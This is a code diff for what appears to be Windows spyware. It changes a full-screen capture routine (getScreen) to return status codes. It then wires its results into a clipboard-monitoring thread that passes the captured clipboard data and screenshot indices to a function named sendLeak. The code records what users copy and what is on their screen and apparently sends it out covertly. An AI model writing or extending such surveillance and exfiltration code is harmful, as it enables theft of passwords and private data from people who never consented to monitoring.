@@ -229,12 +229,12 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 	return -1;
 }
 
-void getScreen(unsigned int idx) {
+int getScreen(unsigned int idx) {
 	wchar_t fileName[10];
 	_snwprintf_s(fileName, 10, L"%d.bmp", idx);
 
 	HANDLE fp = CreateFile(fileName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (fp == INVALID_HANDLE_VALUE) return;
+	if (fp == INVALID_HANDLE_VALUE) return 3;
 
 	HDC hdc = GetDC(NULL);
 	HDC compatDc = CreateCompatibleDC(hdc);
@@ -273,7 +273,7 @@ void getScreen(unsigned int idx) {
 		DeleteObject(srcBmp);
 		DeleteDC(compatDc);
 		CloseHandle(fp);
-		return;
+		return 3;
 	}
 
 	GetDIBits(compatDc, srcBmp, 0, screenHeight, bmpBuffer, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
@@ -291,7 +291,7 @@ void getScreen(unsigned int idx) {
 
 	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
 	ULONG_PTR gdiplusToken;
-	if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) return;
+	if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) return 0;
 
 	CLSID encoderClsid;
 	Gdiplus::Image *image = new Gdiplus::Image(fileName);
@@ -303,12 +303,13 @@ void getScreen(unsigned int idx) {
 			delete image;
 			DeleteFile(fileName);
 			Gdiplus::GdiplusShutdown(gdiplusToken);
-			return;
+			return 1;
 		}
 	}
 
 	delete image;
 	Gdiplus::GdiplusShutdown(gdiplusToken);
+	return 0;
 }
 
 DWORD WINAPI clipBoard(LPVOID args) {
@@ -386,10 +387,20 @@ DWORD WINAPI clipBoard(LPVOID args) {
 						WriteFile(fp, clipBanks[bankIdx].data, clipBanks[bankIdx].size, &written, NULL);
 						CloseHandle(fp);
 
-						getScreen(idx);
+						switch (getScreen(idx)) {
+						case 0:
+							sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size, idx, false);
+							break;
+						case 1:
+							sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size, idx, true);
+							break;
+						default:
+							sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size, 0, false);
+						}
 					}
-
-					sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size);
+					else {
+						sendLeak(clipBanks[bankIdx].data, clipBanks[bankIdx].size, 0, false);
+					}
 				}
 
 				snippetClick = true;
